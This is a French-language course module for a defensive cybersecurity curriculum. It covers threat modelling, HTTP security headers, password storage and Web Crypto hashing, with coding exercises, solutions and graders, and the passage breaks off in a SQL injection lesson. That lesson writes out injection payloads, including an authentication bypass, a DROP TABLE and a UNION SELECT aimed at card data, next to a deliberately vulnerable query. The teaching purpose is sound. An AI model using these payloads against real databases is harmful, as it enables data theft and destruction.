import { code, sortieContient, sortieRegex, expr, exprVerif, codeContient, codeRegex, sansErreur, leveJS } from './_outils.js';

export default {
  description: 'La cybersécurité, côté défense : comprendre comment les attaques fonctionnent pour protéger systèmes, données et utilisateurs. Labs guidés dans le navigateur, analyse de requêtes HTTP, cryptographie avec Web Crypto, détection d\'injections et mini-CTF.',
  intro: `<h3>Cadre éthique</h3><p>Tout ce que tu apprends ici sert à <strong>protéger</strong>. Tester la sécurité d'un système sans autorisation écrite est illégal (en France : articles 323-1 et suivants du Code pénal). Les labs de ce parcours s'exécutent uniquement dans ta page, sur des données simulées. Pour t'entraîner légalement : Root-Me, TryHackMe, Hack The Box, les plateformes de bug bounty avec programmes publics.</p><p class="muted">Les exercices JavaScript s'exécutent dans un bac à sable ; <code>crypto.subtle</code> (Web Crypto) et <code>atob</code>/<code>btoa</code> y sont disponibles.</p>`,
  modules: [
    {
      titre: 'Fondamentaux', niveau: 'Débutant', description: 'Modèle de menace, HTTP/HTTPS, authentification, hachage.',
      lecons: [
        {
          titre: 'Penser comme un défenseur : le modèle de menace',
          theorie: `<p>La sécurité n'est pas une liste d'outils, c'est une façon de raisonner : <em>qu'est-ce que je protège, contre qui, et à quel prix ?</em> Ce raisonnement s'appelle le <strong>modèle de menace</strong>.</p>
<h2>La triade CIA</h2>
<ul><li><strong>Confidentialité</strong> : seules les personnes autorisées lisent la donnée (chiffrement, contrôle d'accès).</li><li><strong>Intégrité</strong> : la donnée n'est pas altérée sans qu'on s'en aperçoive (hachage, signatures).</li><li><strong>Disponibilité</strong> : le service fonctionne quand on en a besoin (redondance, protection anti-DDoS, sauvegardes).</li></ul>
<p>Chaque mesure de sécurité sert au moins l'un de ces trois objectifs. Un ransomware attaque la disponibilité (et menace la confidentialité) ; une fuite de base de données, la confidentialité ; un virement détourné, l'intégrité.</p>
<h2>Les quatre questions du modèle de menace</h2>
<ol><li><strong>Quels actifs ?</strong> Données clients, code source, identifiants, réputation, argent.</li><li><strong>Quels adversaires ?</strong> Script automatisé qui scanne tout Internet, concurrent, employé mécontent, groupe criminel, État. Leurs moyens et motivations diffèrent énormément.</li><li><strong>Quels vecteurs ?</strong> Phishing, mot de passe réutilisé, logiciel non mis à jour, mauvaise configuration cloud, injection dans une application, clé USB, ingénierie sociale.</li><li><strong>Quelles contre-mesures, à quel coût ?</strong> On ne protège pas une boulangerie comme une centrale. La sécurité se négocie avec l'usage et le budget.</li></ol>
<h2>Les principes qui reviennent partout</h2>
<table><tr><th>Principe</th><th>Idée</th><th>Exemple</th></tr>
<tr><td>Moindre privilège</td><td>chaque compte, programme ou service n'a que les droits nécessaires</td><td>le serveur web ne tourne pas en root ; un stagiaire n'est pas admin</td></tr>
<tr><td>Défense en profondeur</td><td>plusieurs couches indépendantes</td><td>pare-feu + authentification + chiffrement + journalisation</td></tr>
<tr><td>Surface d'attaque minimale</td><td>moins de ports, de services, de dépendances exposés</td><td>désactiver ce qui ne sert pas</td></tr>
<tr><td>Fail secure</td><td>en cas d'erreur, refuser plutôt qu'autoriser</td><td>un contrôle d'accès qui plante bloque</td></tr>
<tr><td>Ne jamais faire confiance à l'entrée</td><td>tout ce qui vient de l'extérieur est hostile jusqu'à validation</td><td>formulaires, en-têtes, fichiers, API</td></tr>
<tr><td>Sécurité par l'obscurité = insuffisant</td><td>cacher ne protège pas</td><td>un port non standard n'arrête aucun scanner</td></tr></table>
<h2>Réalité des attaques</h2>
<p>La majorité des incidents ne sont pas des exploits sophistiqués : identifiants volés par phishing (le vecteur n° 1), mots de passe réutilisés fuités ailleurs, logiciels non mis à jour avec des failles connues depuis des mois, buckets cloud publics par erreur. Les quatre gestes qui éliminent l'essentiel du risque : <strong>MFA partout, gestionnaire de mots de passe, mises à jour automatiques, sauvegardes hors ligne testées</strong>.</p>
<h2>Vocabulaire</h2>
<p><strong>Vulnérabilité</strong> : faiblesse. <strong>Exploit</strong> : code qui en tire parti. <strong>CVE</strong> : identifiant public d'une vulnérabilité (CVE-2024-3094). <strong>CVSS</strong> : score de gravité 0-10. <strong>Zero-day</strong> : faille inconnue de l'éditeur. <strong>Red team / blue team</strong> : attaque simulée / défense. <strong>Pentest</strong> : test d'intrusion autorisé et cadré.</p>
<div class="callout info"><b>Le réflexe à prendre</b>Devant toute nouvelle fonctionnalité, demande-toi : « comment quelqu'un pourrait-il en abuser ? » Cette question posée au moment de la conception coûte cent fois moins qu'après l'incident.</div>`,
          exercice: {
            type: 'texte', titre: 'Modèle de menace d\'une boutique en ligne',
            enonce: `<p>Une petite boutique en ligne (site WordPress, paiement par Stripe, 2 employés, base de 5 000 clients). Rédige un modèle de menace court en identifiant : au moins deux actifs, deux adversaires plausibles, trois vecteurs d'attaque réalistes et trois contre-mesures prioritaires. Nomme explicitement les notions (les critères ci-dessous se cochent automatiquement).</p>`,
            placeholder: 'Actifs : …\nAdversaires : …\nVecteurs : …\nContre-mesures : …',
            criteres: [
              { label: 'Mentionne les données clients comme actif', re: /donn[ée]es?\s+(clients?|personnelles)|base\s+clients?/i },
              { label: 'Identifie le phishing ou l\'ingénierie sociale comme vecteur', re: /phishing|hame[çc]onnage|ing[ée]nierie sociale/i },
              { label: 'Mentionne les mises à jour (WordPress, plugins)', re: /mise[s]? [àa] jour|plugins?|extensions?|obsol/i },
              { label: 'Propose l\'authentification à plusieurs facteurs', re: /MFA|2FA|deux facteurs|double authentification|multi-?facteur/i },
              { label: 'Mentionne les sauvegardes', re: /sauvegarde|backup/i },
              { label: 'Identifie au moins un adversaire (script automatisé, criminel, concurrent…)', re: /script|bot|automatis|criminel|ran[çc]ongiciel|ransomware|concurrent|employ/i },
              { label: 'Au moins 80 mots', verif: t => t.trim().split(/\s+/).length >= 80 }
            ],
            solution: `<p><b>Actifs</b> : données clients (noms, adresses, historiques), accès administrateur WordPress, réputation, disponibilité du site en période de ventes, compte Stripe.</p><p><b>Adversaires</b> : scripts automatisés qui scannent les WordPress non à jour ; groupes de rançongiciel ; fraudeur testant des cartes volées ; ancien employé.</p><p><b>Vecteurs</b> : phishing des employés pour voler les identifiants admin ; plugin WordPress non mis à jour avec une CVE connue ; mot de passe admin réutilisé et fuité ; injection via un formulaire de contact.</p><p><b>Contre-mesures prioritaires</b> : MFA sur WordPress, Stripe et les boîtes mail ; mises à jour automatiques et suppression des plugins inutiles ; sauvegardes quotidiennes hors site, testées ; gestionnaire de mots de passe ; limitation des tentatives de connexion ; HTTPS et en-têtes de sécurité.</p>`
          },
          quiz: [
            { q: 'Quel est le vecteur d\'attaque initial le plus fréquent dans les incidents réels ?', options: ['Les failles zero-day', 'Le phishing et les identifiants volés', 'Les attaques physiques'], bonne: 1, explication: 'L\'humain et les mots de passe restent le maillon faible ; d\'où la priorité au MFA.' },
            { q: 'Que signifie le principe de moindre privilège ?', options: ['Donner le minimum de droits nécessaires à chaque acteur', 'Interdire tout accès', 'Réserver les droits aux administrateurs'], bonne: 0, explication: 'Un compte compromis ne peut alors faire que des dégâts limités.' },
            { q: 'Un port SSH déplacé sur 2222 au lieu de 22 est…', options: ['Une protection solide', 'De la sécurité par l\'obscurité : réduit le bruit mais n\'arrête pas un attaquant', 'Illégal'], bonne: 1, explication: 'Les scanners testent tous les ports. Clés SSH, MFA et fail2ban protègent vraiment.' }
          ]
        },
        {
          titre: 'HTTP et HTTPS : lire les en-têtes',
          theorie: `<p>Tout le web parle HTTP. Comprendre une requête et une réponse ligne par ligne est la base pour repérer une mauvaise configuration, un cookie mal protégé ou une fuite d'information.</p>
<h2>Une requête</h2>
${code('bash', `GET /compte HTTP/1.1
Host: boutique.fr
Cookie: session=abc123
User-Agent: Mozilla/5.0 ...
Accept: text/html
Authorization: Bearer eyJhbGciOi...`)}
<p>Méthode, chemin, version, puis des en-têtes <code>Nom: valeur</code>, une ligne vide, et éventuellement un corps (POST). Tout est du texte : avec HTTP seul, n'importe qui sur le réseau (Wi-Fi public, FAI) lit les cookies et les mots de passe.</p>
<h2>Une réponse</h2>
${code('bash', `HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Server: nginx`)}
<h2>Les en-têtes de sécurité</h2>
<table><tr><th>En-tête</th><th>Protège contre</th></tr>
<tr><td><code>Strict-Transport-Security</code> (HSTS)</td><td>le passage en HTTP : le navigateur n'utilisera plus que HTTPS pour ce domaine</td></tr>
<tr><td><code>Content-Security-Policy</code> (CSP)</td><td>XSS : liste des sources autorisées pour scripts, styles, images</td></tr>
<tr><td><code>X-Content-Type-Options: nosniff</code></td><td>l'interprétation d'un fichier comme un autre type</td></tr>
<tr><td><code>X-Frame-Options</code> / CSP <code>frame-ancestors</code></td><td>le clickjacking (site affiché dans une iframe invisible)</td></tr>
<tr><td><code>Referrer-Policy</code></td><td>la fuite de l'URL d'origine vers des sites tiers</td></tr>
<tr><td><code>Permissions-Policy</code></td><td>l'usage non souhaité de caméra, micro, géolocalisation</td></tr></table>
<p>Les attributs de cookie : <code>HttpOnly</code> (inaccessible à JavaScript, donc à un XSS), <code>Secure</code> (jamais envoyé en HTTP), <code>SameSite=Lax|Strict</code> (pas envoyé depuis un autre site : anti-CSRF). Un cookie de session sans ces trois attributs est une faille.</p>
<h2>Fuites d'information</h2>
<p><code>Server: Apache/2.4.29 (Ubuntu)</code> ou <code>X-Powered-By: PHP/7.2.1</code> annoncent une version précise, donc ses CVE connues. On masque ces en-têtes. Les messages d'erreur détaillés (stack trace, requête SQL) en production sont du même ordre.</p>
<h2>HTTPS / TLS</h2>
<p>TLS chiffre la connexion et authentifie le serveur via un <strong>certificat</strong> signé par une autorité (Let's Encrypt, gratuit et automatique). Le cadenas garantit que tu parles au bon serveur et que personne ne lit en chemin ; il ne garantit pas que le site est honnête. Codes utiles : 301/302 (redirection), 401 (non authentifié), 403 (interdit), 429 (trop de requêtes : rate limiting).</p>
<h2>Observer</h2>
<p>DevTools → Réseau → clic sur une requête → onglet En-têtes. En ligne de commande : <code>curl -I https://exemple.fr</code> affiche les en-têtes de réponse. Des services comme securityheaders.com notent la configuration d'un site.</p>
<div class="callout info"><b>Lab</b>Dans l'exercice, tu écris un analyseur d'en-têtes qui détecte les en-têtes manquants et les cookies mal configurés : exactement ce que font les scanners de configuration.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Audit d\'en-têtes HTTP',
            enonce: `<p>Écris <code>analyserReponse(texte)</code> qui reçoit une réponse HTTP brute (ligne de statut + en-têtes) et renvoie un objet <code>{ statut, entetes, problemes }</code> : <code>statut</code> le code numérique, <code>entetes</code> un objet avec les noms en minuscules, et <code>problemes</code> un tableau de chaînes parmi : <code>"HSTS manquant"</code>, <code>"CSP manquante"</code>, <code>"X-Content-Type-Options manquant"</code>, <code>"Cookie sans HttpOnly"</code>, <code>"Cookie sans Secure"</code>, <code>"Cookie sans SameSite"</code>, <code>"Version du serveur exposée"</code> (si <code>Server</code> ou <code>X-Powered-By</code> contient un numéro de version). Affiche le résultat pour la réponse fournie.</p>`,
            depart: `const reponse = \`HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=abc123; Path=/
Server: Apache/2.4.29 (Ubuntu)
X-Frame-Options: DENY\`;

function analyserReponse(texte) {
  // ...
}

console.log(analyserReponse(reponse));
`,
            solution: `const reponse = \`HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=abc123; Path=/
Server: Apache/2.4.29 (Ubuntu)
X-Frame-Options: DENY\`;

function analyserReponse(texte) {
  const lignes = texte.split(/\\r?\\n/);
  const statut = parseInt(lignes[0].split(" ")[1], 10);
  const entetes = {};
  const cookies = [];
  for (const ligne of lignes.slice(1)) {
    const i = ligne.indexOf(":");
    if (i === -1) continue;
    const nom = ligne.slice(0, i).trim().toLowerCase();
    const valeur = ligne.slice(i + 1).trim();
    if (nom === "set-cookie") cookies.push(valeur);
    entetes[nom] = valeur;
  }
  const problemes = [];
  if (!entetes["strict-transport-security"]) problemes.push("HSTS manquant");
  if (!entetes["content-security-policy"]) problemes.push("CSP manquante");
  if (!entetes["x-content-type-options"]) problemes.push("X-Content-Type-Options manquant");
  for (const c of cookies) {
    if (!/httponly/i.test(c)) problemes.push("Cookie sans HttpOnly");
    if (!/secure/i.test(c)) problemes.push("Cookie sans Secure");
    if (!/samesite/i.test(c)) problemes.push("Cookie sans SameSite");
  }
  const serveur = (entetes["server"] || "") + " " + (entetes["x-powered-by"] || "");
  if (/\\d+\\.\\d+/.test(serveur)) problemes.push("Version du serveur exposée");
  return { statut, entetes, problemes };
}

console.log(analyserReponse(reponse));`,
            tests: [sansErreur(), expr('analyserReponse(reponse).statut', 200), expr('analyserReponse(reponse).entetes["x-frame-options"]', 'DENY', 'Les noms d\'en-têtes doivent être en minuscules dans l\'objet entetes.'), exprVerif('analyserReponse(reponse).problemes', 'Tous les problèmes de la réponse fournie sont détectés', v => ['HSTS manquant', 'CSP manquante', 'X-Content-Type-Options manquant', 'Cookie sans HttpOnly', 'Cookie sans Secure', 'Cookie sans SameSite', 'Version du serveur exposée'].every(p => v.includes(p)) && v.length === 7, 'Attendu exactement 7 problèmes : HSTS, CSP, X-Content-Type-Options, les trois attributs de cookie et la version du serveur.'), expr('analyserReponse("HTTP/1.1 302 Found\\nLocation: /\\nStrict-Transport-Security: max-age=1\\nContent-Security-Policy: default-src \'self\'\\nX-Content-Type-Options: nosniff\\nSet-Cookie: s=1; HttpOnly; Secure; SameSite=Strict\\nServer: nginx").problemes', [], 'Une réponse bien configurée ne doit remonter aucun problème (et "nginx" sans version n\'est pas une fuite).'), expr('analyserReponse("HTTP/1.1 404 Not Found\\nX-Powered-By: PHP/8.1.2\\nStrict-Transport-Security: a\\nContent-Security-Policy: b\\nX-Content-Type-Options: nosniff").problemes', ['Version du serveur exposée'])]
          },
          quiz: [
            { q: 'Que fait l\'attribut <code>HttpOnly</code> sur un cookie ?', options: ['Il force HTTPS', 'Il rend le cookie inaccessible à JavaScript', 'Il expire le cookie'], bonne: 1, explication: 'Un XSS ne peut alors pas voler le cookie de session.' },
            { q: 'À quoi sert HSTS ?', options: ['À compresser la réponse', 'À forcer le navigateur à n\'utiliser que HTTPS pour le domaine', 'À bloquer les iframes'], bonne: 1, explication: 'Même si l\'utilisateur tape http://, le navigateur passe en HTTPS sans requête en clair.' },
            { q: 'Pourquoi masquer <code>Server: Apache/2.4.29</code> ?', options: ['Pour la performance', 'Pour ne pas révéler une version et ses failles connues', 'C\'est illégal de l\'afficher'], bonne: 1, explication: 'Cela ne remplace pas la mise à jour, mais réduit le ciblage automatique.' }
          ]
        },
        {
          titre: 'Mots de passe et authentification',
          theorie: `<p>L'authentification répond à « qui es-tu ? ». Le mot de passe en reste la base, et il est attaqué par trois voies : le <strong>vol</strong> (phishing, fuite), la <strong>devinette</strong> (force brute, dictionnaire) et la <strong>réutilisation</strong> (credential stuffing : un mot de passe fuité d'un site est testé sur tous les autres).</p>
<h2>Ce qui fait un bon mot de passe</h2>
<p>La force se mesure en <strong>entropie</strong> (bits) : <code>log₂(taille de l'alphabet) × longueur</code>. Huit caractères mixtes (~70 symboles) ≈ 49 bits : cassable en heures hors ligne. Une phrase de passe de cinq mots aléatoires d'un dictionnaire de 7 776 mots (méthode Diceware) ≈ 64 bits et se mémorise. La longueur compte plus que la complexité.</p>
<table><tr><th>Mot de passe</th><th>Problème</th></tr>
<tr><td><code>Soleil2024!</code></td><td>mot du dictionnaire + année + symbole : motif prévisible, cassé par les règles des outils</td></tr>
<tr><td><code>azerty123</code></td><td>top 100 des fuites</td></tr>
<tr><td><code>cheval-batterie-agrafe-correct</code></td><td>bon si réellement aléatoire</td></tr>
<tr><td><code>Xk9#mQ2$vL7!pR4&amp;</code></td><td>excellent, mais impossible à retenir : rôle du gestionnaire</td></tr></table>
<h2>Les règles modernes (NIST, ANSSI)</h2>
<ul><li>Longueur minimale 12 (ou 8 avec MFA), pas de maximum raisonnable, tous caractères acceptés.</li><li>Pas de règles de composition arbitraires ni d'expiration périodique : elles produisent <code>Soleil2024!</code> puis <code>Soleil2025!</code>.</li><li>Rejeter les mots de passe présents dans les fuites connues (API Have I Been Pwned, par préfixe de hash, sans envoyer le mot de passe).</li><li>Limiter les tentatives (rate limiting, délai croissant), sans bloquer définitivement (déni de service).</li><li><strong>Un mot de passe unique par service</strong>, via un gestionnaire (Bitwarden, KeePassXC, 1Password).</li></ul>
<h2>MFA : le multiplicateur</h2>
<p>Un second facteur (quelque chose que tu <em>as</em>) rend le mot de passe volé inutile. Par ordre de robustesse : SMS (vulnérable au SIM swap) &lt; application TOTP (Aegis, Google Authenticator) &lt; notification push &lt; clé physique FIDO2/passkey (résiste au phishing car liée au domaine). Les <strong>passkeys</strong> remplacent progressivement le mot de passe lui-même.</p>
<h2>Côté serveur : ne jamais stocker un mot de passe</h2>
<p>On stocke un <strong>hachage lent et salé</strong> : <code>bcrypt</code>, <code>scrypt</code> ou <code>Argon2id</code> (recommandé). Le <em>sel</em> (valeur aléatoire par utilisateur) empêche les tables précalculées ; la lenteur (centaines de millisecondes) rend la force brute impraticable. <code>MD5</code>, <code>SHA-1</code> ou <code>SHA-256</code> seuls sont des erreurs : trop rapides (milliards d'essais par seconde sur GPU).</p>
${code('python', `# Python : hachage correct avec argon2-cffi
from argon2 import PasswordHasher
ph = PasswordHasher()
empreinte = ph.hash("mot de passe")     # $argon2id$v=19$m=65536,t=3,p=4$...sel...$...hash...
ph.verify(empreinte, "mot de passe")   # True, ou lève VerifyMismatchError`)}
<h2>Sessions et jetons</h2>
<p>Après authentification, le serveur émet un identifiant de session (cookie HttpOnly, Secure, SameSite) ou un jeton (JWT). Un JWT est signé, pas chiffré : son contenu se lit en base64. Ne jamais y mettre de secret, toujours vérifier la signature et l'expiration côté serveur, et prévoir la révocation.</p>
<div class="callout warn"><b>Récupération de compte</b>Souvent le maillon faible : questions secrètes devinables, lien de réinitialisation sans expiration. Un lien à usage unique, expirant en 15 minutes, envoyé à l'adresse vérifiée, et une notification de changement.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Évaluateur de mots de passe',
            enonce: `<p>Écris <code>entropie(mdp)</code> qui estime les bits d'entropie : taille d'alphabet = 26 si minuscules présentes + 26 si majuscules + 10 si chiffres + 33 si autres caractères, résultat <code>longueur × log2(taille)</code> arrondi à l'entier. Puis <code>evaluer(mdp, fuites)</code> (où <code>fuites</code> est un <code>Set</code> de mots de passe connus) renvoie <code>{ bits, verdict, raisons }</code> avec <code>verdict</code> = <code>"refuse"</code> si présent dans les fuites, longueur &lt; 12 ou bits &lt; 50 ; <code>"acceptable"</code> si bits &lt; 80 ; <code>"fort"</code> sinon. <code>raisons</code> liste les motifs de refus parmi <code>"fuite"</code>, <code>"trop court"</code>, <code>"entropie faible"</code>.</p>`,
            depart: `const fuites = new Set(["azerty123", "Soleil2024!", "password", "motdepasse"]);

function entropie(mdp) {
  // ...
}

function evaluer(mdp, fuites) {
  // ...
}

for (const m of ["azerty123", "Soleil2024!", "cheval-batterie-agrafe-correct", "Xk9#mQ2$vL7!pR4&"]) {
  console.log(m, evaluer(m, fuites));
}
`,
            solution: `const fuites = new Set(["azerty123", "Soleil2024!", "password", "motdepasse"]);

function entropie(mdp) {
  let alphabet = 0;
  if (/[a-z]/.test(mdp)) alphabet += 26;
  if (/[A-Z]/.test(mdp)) alphabet += 26;
  if (/[0-9]/.test(mdp)) alphabet += 10;
  if (/[^a-zA-Z0-9]/.test(mdp)) alphabet += 33;
  if (alphabet === 0 || mdp.length === 0) return 0;
  return Math.round(mdp.length * Math.log2(alphabet));
}

function evaluer(mdp, fuites) {
  const bits = entropie(mdp);
  const raisons = [];
  if (fuites.has(mdp)) raisons.push("fuite");
  if (mdp.length < 12) raisons.push("trop court");
  if (bits < 50) raisons.push("entropie faible");
  let verdict = "fort";
  if (raisons.length) verdict = "refuse";
  else if (bits < 80) verdict = "acceptable";
  return { bits, verdict, raisons };
}

for (const m of ["azerty123", "Soleil2024!", "cheval-batterie-agrafe-correct", "Xk9#mQ2$vL7!pR4&"]) {
  console.log(m, evaluer(m, fuites));
}`,
            tests: [sansErreur(), expr('entropie("azerty123")', 47), expr('entropie("Xk9#mQ2$vL7!pR4&")', 105), expr('entropie("")', 0), expr('evaluer("azerty123", fuites).verdict', 'refuse'), expr('evaluer("azerty123", fuites).raisons', ['fuite', 'trop court', 'entropie faible']), expr('evaluer("Soleil2024!", fuites).raisons', ['fuite', 'trop court']), expr('evaluer("cheval-batterie-agrafe-correct", fuites).verdict', 'fort'), expr('evaluer("abcdefghijkl", fuites).verdict', 'acceptable', '12 minuscules : 56 bits → acceptable (ni refusé, ni fort).'), expr('evaluer("Xk9#mQ2$vL7!pR4&", fuites).verdict', 'fort')]
          },
          quiz: [
            { q: 'Quel facteur compte le plus pour la force d\'un mot de passe ?', options: ['Le nombre de symboles spéciaux', 'La longueur', 'La présence d\'une majuscule'], bonne: 1, explication: 'L\'entropie croît linéairement avec la longueur ; une phrase de passe longue bat un mot court et complexe.' },
            { q: 'Comment stocker un mot de passe côté serveur ?', options: ['Chiffré avec AES', 'Haché avec SHA-256', 'Haché avec un algorithme lent et salé (Argon2id, bcrypt)'], bonne: 2, explication: 'Le chiffrement est réversible ; SHA-256 est trop rapide pour résister à la force brute.' },
            { q: 'Quel second facteur résiste au phishing ?', options: ['Code SMS', 'Clé FIDO2 / passkey', 'Question secrète'], bonne: 1, explication: 'La clé signe un défi lié au domaine réel : un site imitant ne peut pas obtenir une réponse valide.' }
          ]
        },
        {
          titre: 'Hachage et intégrité avec Web Crypto',
          theorie: `<p>Une <strong>fonction de hachage</strong> transforme n'importe quelle donnée en une empreinte de taille fixe. Elle est au cœur de l'intégrité des fichiers, des signatures, des blockchains, du stockage des mots de passe et de Git.</p>
<h2>Propriétés d'un hachage cryptographique</h2>
<ul><li><strong>Déterministe</strong> : même entrée → même empreinte.</li><li><strong>Rapide à calculer</strong>, <strong>impossible à inverser</strong> (sens unique).</li><li><strong>Effet avalanche</strong> : changer un bit change environ la moitié de l'empreinte.</li><li><strong>Résistance aux collisions</strong> : on ne sait pas trouver deux entrées de même empreinte. MD5 et SHA-1 ont perdu cette propriété : obsolètes. SHA-256, SHA-3, BLAKE3 sont sûrs.</li></ul>
${code('bash', `sha256sum ubuntu.iso          # vérifier un téléchargement contre l'empreinte publiée
echo -n "bonjour" | sha256sum  # 2cb4b1431b84ec15d35ed83bb927ab30...`)}
<h2>Web Crypto dans le navigateur</h2>
${code('javascript', `async function sha256(texte) {
  const donnees = new TextEncoder().encode(texte);            // chaîne → octets UTF-8
  const empreinte = await crypto.subtle.digest("SHA-256", donnees);   // ArrayBuffer de 32 octets
  return [...new Uint8Array(empreinte)].map(o => o.toString(16).padStart(2, "0")).join("");   // → hexadécimal
}
console.log(await sha256("bonjour"));   // 2cb4b1431b84ec15d35ed83bb927ab30d6c7e7a4a5e3b3cdf9b58c5f4eb5a3c0 (64 caractères hex)`)}
<p><code>crypto.subtle</code> n'est disponible qu'en contexte sécurisé (HTTPS ou localhost). <code>crypto.getRandomValues()</code> fournit de l'aléatoire cryptographique, à utiliser pour tout secret (jamais <code>Math.random()</code>).</p>
<h2>Usages</h2>
<table><tr><th>Usage</th><th>Comment</th></tr>
<tr><td>Intégrité d'un fichier</td><td>comparer l'empreinte calculée à celle publiée (par un canal de confiance)</td></tr>
<tr><td>Mots de passe</td><td>hachage <em>lent</em> et salé : Argon2, bcrypt (pas SHA-256 seul)</td></tr>
<tr><td>Authentification de message (HMAC)</td><td>hachage avec une clé secrète : prouve l'origine ET l'intégrité (webhooks, JWT HS256)</td></tr>
<tr><td>Déduplication, cache, identifiants</td><td>Git identifie chaque objet par son SHA</td></tr>
<tr><td>Vérification sans révéler</td><td>Have I Been Pwned : on envoie les 5 premiers caractères du SHA-1, on compare localement</td></tr></table>
<h2>HMAC avec Web Crypto</h2>
${code('javascript', `const cle = await crypto.subtle.importKey("raw", new TextEncoder().encode("secret-partagé"), { name: "HMAC", hash: "SHA-256" }, false, ["sign", "verify"]);
const signature = await crypto.subtle.sign("HMAC", cle, new TextEncoder().encode(message));
const valide = await crypto.subtle.verify("HMAC", cle, signature, new TextEncoder().encode(message));`)}
<p>Un serveur qui reçoit un webhook (Stripe, GitHub) recalcule le HMAC avec le secret partagé et le compare : un message forgé ou modifié est rejeté. Compare toujours les signatures en <strong>temps constant</strong> (<code>subtle.verify</code> le fait) pour éviter les attaques par chronométrage.</p>
<h2>Ce qu'un hachage n'est pas</h2>
<p>Ce n'est pas du chiffrement (pas de clé, pas de déchiffrement) et ce n'est pas secret : l'empreinte d'un mot courant se retrouve en une requête dans une table arc-en-ciel. D'où le sel pour les mots de passe, et l'HMAC quand il faut une clé.</p>
<div class="callout info"><b>Lab</b>Tu vas implémenter la vérification d'intégrité et détecter une altération d'un seul caractère : l'effet avalanche rend la modification évidente.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Vérifier l\'intégrité d\'un message',
            enonce: `<p>Écris <code>async function sha256Hex(texte)</code> (Web Crypto, résultat hexadécimal en minuscules), <code>async function verifier(texte, empreinteAttendue)</code> qui renvoie <code>true</code>/<code>false</code>, et <code>function distanceBits(hexA, hexB)</code> qui compte les bits différents entre deux empreintes hexadécimales. Dans <code>principal()</code>, calcule l'empreinte de <code>"virement de 100 EUR"</code>, vérifie-la, puis compare avec l'empreinte de <code>"virement de 900 EUR"</code> : affiche le nombre de bits différents (sur 256). Expose les résultats dans des variables globales <code>empreinte</code>, <code>ok</code> et <code>bits</code>.</p>`,
            depart: `async function sha256Hex(texte) {
  // ...
}

async function verifier(texte, empreinteAttendue) {
  // ...
}

function distanceBits(hexA, hexB) {
  // ...
}

let empreinte, ok, bits;
async function principal() {
  // ...
  console.log(empreinte, ok, bits);
}
principal();
`,
            solution: `async function sha256Hex(texte) {
  const donnees = new TextEncoder().encode(texte);
  const buffer = await crypto.subtle.digest("SHA-256", donnees);
  return [...new Uint8Array(buffer)].map(o => o.toString(16).padStart(2, "0")).join("");
}

async function verifier(texte, empreinteAttendue) {
  const calculee = await sha256Hex(texte);
  return calculee === empreinteAttendue.toLowerCase();
}

function distanceBits(hexA, hexB) {
  let n = 0;
  for (let i = 0; i < hexA.length; i++) {
    let x = parseInt(hexA[i], 16) ^ parseInt(hexB[i], 16);
    while (x) { n += x & 1; x >>= 1; }
  }
  return n;
}

let empreinte, ok, bits;
async function principal() {
  empreinte = await sha256Hex("virement de 100 EUR");
  ok = await verifier("virement de 100 EUR", empreinte);
  const autre = await sha256Hex("virement de 900 EUR");
  bits = distanceBits(empreinte, autre);
  console.log(empreinte, ok, bits);
}
principal();`,
            tests: [sansErreur(), exprVerif('empreinte', 'Empreinte hexadécimale de 64 caractères', v => typeof v === 'string' && /^[0-9a-f]{64}$/.test(v), 'sha256Hex doit renvoyer 64 caractères hexadécimaux minuscules.'), expr('ok', true), exprVerif('bits', 'Effet avalanche : environ la moitié des 256 bits diffèrent', v => v >= 90 && v <= 170, 'Entre deux messages proches, on attend ~128 bits différents (entre 90 et 170).'), expr('distanceBits("ff", "00")', 8), expr('distanceBits("abcd", "abcd")', 0), codeContient('crypto.subtle.digest', 'Utilise crypto.subtle.digest("SHA-256", …).'), codeContient('TextEncoder', 'Encode le texte en octets avec TextEncoder avant de hacher.')]
          },
          quiz: [
            { q: 'Quelle propriété garantit qu\'une petite modification change radicalement l\'empreinte ?', options: ['Le déterminisme', 'L\'effet avalanche', 'La compression'], bonne: 1, explication: 'Environ la moitié des bits changent : toute altération est visible.' },
            { q: 'Pourquoi SHA-256 seul est-il inadapté aux mots de passe ?', options: ['Il est cassé', 'Il est trop rapide : la force brute est praticable', 'Il produit une empreinte trop courte'], bonne: 1, explication: 'Les fonctions dédiées (Argon2, bcrypt) sont volontairement lentes et salées.' },
            { q: 'Qu\'ajoute un HMAC par rapport à un simple hachage ?', options: ['Du chiffrement', 'Une clé secrète : preuve d\'origine en plus de l\'intégrité', 'De la compression'], bonne: 1, explication: 'Sans la clé, impossible de produire une signature valide.' }
          ]
        }
      ]
    },
    {
      titre: 'Sécurité des applications web', niveau: 'Intermédiaire', description: 'Injections SQL, XSS, CSRF et sessions, contrôle d\'accès : les failles du Top 10 OWASP, et leurs parades.',
      lecons: [
        {
          titre: 'Injection SQL',
          theorie: `<p>L'<strong>injection SQL</strong> survient quand une entrée utilisateur est concaténée dans une requête : l'attaquant écrit du SQL à la place d'une valeur. Vingt-cinq ans après sa découverte, elle reste dans le Top 10 OWASP, parce que la concaténation est le réflexe naturel du débutant.</p>
<h2>Le code vulnérable</h2>
${code('python', `# VULNÉRABLE : ne jamais faire ceci
requete = f"SELECT * FROM utilisateurs WHERE email = '{email}' AND mdp = '{mdp}'"
curseur.execute(requete)`)}
<p>Avec <code>email = ' OR '1'='1' --</code>, la requête devient <code>… WHERE email = '' OR '1'='1' --' AND mdp = ''</code> : la condition est toujours vraie, le reste est commenté. Connexion sans mot de passe. Pire : <code>'; DROP TABLE utilisateurs; --</code>, ou <code>' UNION SELECT carte, cvv FROM paiements --</code> pour extraire d'autres tables.</p>
<h2>La parade : requêtes paramétrées</h2>
${code('python', `# CORRECT : la valeur est transmise séparément, jamais interprétée comme du SQL
curseur.execute("SELECT * FROM utilisateurs WHERE email = ? AND mdp_hash = ?", (email, hash_mdp))
# Node : db.query("SELECT ... WHERE email = $1", [email])
# PHP PDO : $stmt = $pdo->prepare("... WHERE email = :email"); $stmt->execute(["email" => $email]);`)}
